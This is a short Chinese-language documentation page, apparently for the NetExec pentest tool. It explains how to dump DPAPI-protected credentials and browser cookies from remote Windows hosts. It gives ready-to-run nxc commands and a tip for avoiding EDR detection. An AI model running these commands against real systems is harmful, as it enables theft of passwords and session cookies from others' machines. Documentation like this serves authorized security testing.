---
description: 使用 NetExec 导出 DPAPI 凭证
---

# 导出 DPAPI

你可以使用 NetExec 的 `--dpapi` 选项导出 DPAPI 凭证。它将获取凭证管理器、Chrome、Edge、Firefox 中的所有密钥。`--dpapi` 支持以下选项：

* cookies：收集浏览器中的所有 cookies
* nosystem：不收集系统凭证。这可以防止 EDR 阻止你获取密码 :fire:

{% hint style="danger" %}
你需要在远程目标上至少具有本地管理员权限，如果你的用户是本地账户，请使用 **--local-auth**
{% endhint %}

```
$ nxc smb <ip> -u user -p password --dpapi
$ nxc smb <ip> -u user -p password --dpapi cookies
$ nxc smb <ip> -u user -p password --dpapi nosystem
$ nxc smb <ip> -u user -p password --local-auth --dpapi nosystem
```
